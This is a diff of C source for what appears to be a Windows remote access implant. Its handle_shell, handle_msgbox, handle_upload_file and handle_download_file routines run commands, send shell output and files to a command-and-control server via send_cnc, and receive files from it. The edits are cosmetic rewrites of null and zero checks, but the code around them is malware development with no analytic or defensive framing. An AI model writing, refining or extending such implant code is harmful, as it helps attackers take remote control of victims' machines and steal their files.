@@ -45,7 +45,7 @@ void handle_shell()
         return;
     }
     cmd.cmd = malloc(cmd.cmd_len + 1);
-    if (!cmd.cmd)
+    if (cmd.cmd == 0)
     {
         log_error("Failed to allocate memory for the command.");
         return;
@@ -62,7 +62,7 @@ void handle_shell()
     while (TRUE)
     {
         bytes_read = read_shell_output(&cmd);
-        if (bytes_read)
+        if (bytes_read != 0)
         {
             send_cnc(&bytes_read, sizeof(bytes_read));
             send_cnc(cmd.out, bytes_read);
@@ -91,7 +91,7 @@ void handle_msgbox()
         return;
     }
     cmd.title = malloc(cmd.title_len + 1);
-    if (!cmd.title)
+    if (cmd.title == 0)
     {
         log_error("Failed to allocate memory for the title.");
         return;
@@ -111,7 +111,7 @@ void handle_msgbox()
         return;
     }
     cmd.text = malloc(cmd.text_len + 1);
-    if (!cmd.text)
+    if (cmd.text == 0)
     {
         log_error("Failed to allocate memory for the text.");
         return;
@@ -152,7 +152,7 @@ void handle_upload_file()
         return;
     }
     cmd.local_path = malloc(cmd.local_path_len + 1);
-    if (!cmd.local_path)
+    if (cmd.local_path == 0)
     {
         log_error("Failed to allocate memory for file path.");
         return;
@@ -178,7 +178,7 @@ void handle_upload_file()
     if (bytes_read != sizeof(ret))
         fatal_error("Failed to send return code of CreateFile.");
 
-    if (ret)
+    if (ret != 0)
         return;
 
     cmd.file_size = GetFileSize(file, NULL);
@@ -192,7 +192,7 @@ void handle_upload_file()
     {
         if (!ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL))
             fatal_error("Failed to read from file.");
-        if (!bytes_read)
+        if (bytes_read == 0)
         {
             CloseHandle(file);
             return;
@@ -219,7 +219,7 @@ void handle_download_file()
         return;
     }
     cmd.local_path = malloc(cmd.local_path_len + 1);
-    if (!cmd.local_path)
+    if (cmd.local_path == 0)
     {
         log_error("Failed to allocate memory for file path.");
         return;
@@ -245,7 +245,7 @@ void handle_download_file()
     if (bytes_read != sizeof(ret))
         fatal_error("Failed to send return code of CreateFile.");
 
-    if (ret)
+    if (ret != 0)
         return;
 
     bytes_read = recv_cnc(&cmd.file_size, sizeof(cmd.file_size));
